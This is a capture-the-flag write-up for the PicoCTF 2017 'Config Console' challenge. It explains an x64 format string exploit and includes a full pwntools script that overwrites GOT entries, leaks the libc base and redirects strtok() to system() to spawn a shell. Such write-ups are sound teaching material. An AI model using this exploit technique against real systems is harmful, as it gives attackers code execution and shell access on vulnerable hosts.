### Solved by Swappage

Config console was a binary exploitation problem focused on format string attacks, it was a.. let's say.. quite academic problem,
a stadard example of how you would exploit a format string bug, if it wasn't for single, simple fact... IT WAS COMPILED FOR x64 ARCHITECTURE.

the fact that the binary was compiled as an x64 architecture transformed the problem from a simple format string exercise into quite a nightmare, because of a simple reason:

![](/images/2017/PicoCTF/Config_Console/1.jpg)

So, how to deal with all of this? because how printf() works, we cant use null bytes in our format string payloads, but at the same time, because of how intel x64 architecture works, the canonical address range goes from 0x00 to 0xffffffffffff, meaning that a p64() of every input we provide as address will ALWAYS contain a null byte!.

Oh, and i almost forgot, the application was made to exit after every execution, so we had to find a way to prevent the program from exiting if we wanted to

- leak a libc address first
- redirect the execution

The way i managed to exploiot this was to heavly relay on partial overwrites using positional and half formatting strings.

The scenario for the exploitation was the following

- in the first stage i wanted to overwrite the address of exit@GOT with the address of loop(), this would prevent the application for exiting after the first cycle.
- then use a format string to leak glibc base address
- calculate the address of system() in libc
- overwrite another address in the GOT
- jump to that function to get a shell.

Here is the exploit, that i think is more explainatory then everything i can say.

The first part was easy, to prevent the nullbyte problem i simply put the address at the end, so thanks to the architecture endianness the nullbyte would end up terminating the buffer anyway

Leaking the libc was also easy, because an address was at the third position in the format string leak.

the most annoying part of all the challenge was the fact that i couldn't overwrite an address in the GOT with the pointer to system() in a single run, to fix this i had to forge 2 pointers on the stack, always taking care of the null bytes, and then do a partial overwrite, i decided to overwrite strtok() with system because a user supplied input was directly passed to the function, that way when strtok() was invoked, it was enaugh to send a line containing /bin/sh to get a shell.

The exploit code is fairly commented, so i think it doesn't need any further explanation.

```python
#!/usr/bin/python

from pwn import *
import sys

# address of exit@GOT
addr = 0x601258

# address of printf@GOT
# i don't use this anymore.
printf = 0x601238

#address of loop()
loop_addr = 0x4009bd

#libc address in %3$p
#libc base @ %3$p - 0xdb620


# stage 1: cause the app to never exit by overwriting exit@GOT with loop()
payload = "e "
payload += "%" + str(loop_addr - len(payload) + 1) + "c"
payload += " %17$n "
payload += "aaaaaa"
payload += p64(addr)
payload += "\n"

# stage 2: leak the libc base address
payload2 = "e "
payload2 += "%3$p"
payload2 += "\n"

#r = remote("192.168.1.90", 1337)
r = remote("shell2017.picoctf.com", 42132)

r.recvuntil(": ")
r.sendline(payload)
r.recvuntil("Config action: ")

r.sendline(payload2)
r.recvuntil("Config action: ")

#
# offsets and such.
#
# on debian:
# base = $3$p - 0xdbc00
# 1shot @ base + 0x41374
# system() @ base + 0x41490
#

address = r.recvuntil("Config action: ")
address = address.split("!\n")[1].split("Config")[0]
log.info("leaked address: " + address)
libc_base = int(address, 16) - 0xdbc00
log.info("Libc basse: " + str(hex(libc_base)))
system_addr = libc_base + 0x41490
system_address = hex(system_addr)
log.info("System address: " + str(system_address))

#
# overwriting in one shot doesn't work for some reasons
# we need to do partial overwrite of strtok@GOT with address of system()
# LSDB HSB and bullshit..
antani = str(system_address)
lsb = "0x" + antani[-6:]
hsb = antani[:8]

log.info("hsb: " + hsb)
log.info("lsb: " + lsb)

lsb = int(lsb,16)
hsb = int(hsb, 16)

diff = hsb - lsb

#
# the exploit isn't 100% reliable. I didn't bother to take a negative result in account. if it happens just close and try again
# this is because I'm too lazy to do the maths for the input bytes for the fmt
#
if diff < 0:
	log.error("lsb < hsb, exploit won't work this time, abarting, just try again.")
	r.close()
	exit()

log.info("diff: " + str(hex(hsb - lsb)))

# setting some addresses on the stack
# here we put pointers to strtok@GOT and strtok@GOT+3 on the stack so
# we can access them via format string for overwriting
#
payload4 = "l "
payload4 += "aaaaaa"
payload4 += p64(0x601253) # %295$p

payload5 = "p "
payload5 += "aaaaaa"
payload5 += p64(0x601250) # %155$p

#
# the final stage: overwrite strtok@GOT with system() and pass /bin/sh as argument
#
payload6 = "e "
payload6 += "%" + str(lsb) +"c"
payload6 += "%155$n"
payload6 += "%" + str(hsb-lsb) + "c"
payload6 += "%295$n"

log.info("Ready to send the final payload: " + payload6)
log.info("hit enter to continue, this will return lot of garbage output before popping a shell")
raw_input()

r.recv()
r.sendline(payload4)
r.recv()
r.sendline(payload5)
r.recv()
r.sendline(payload6)
r.recvuntil(": ")
r.sendline("/bin/sh")
r.interactive()

```
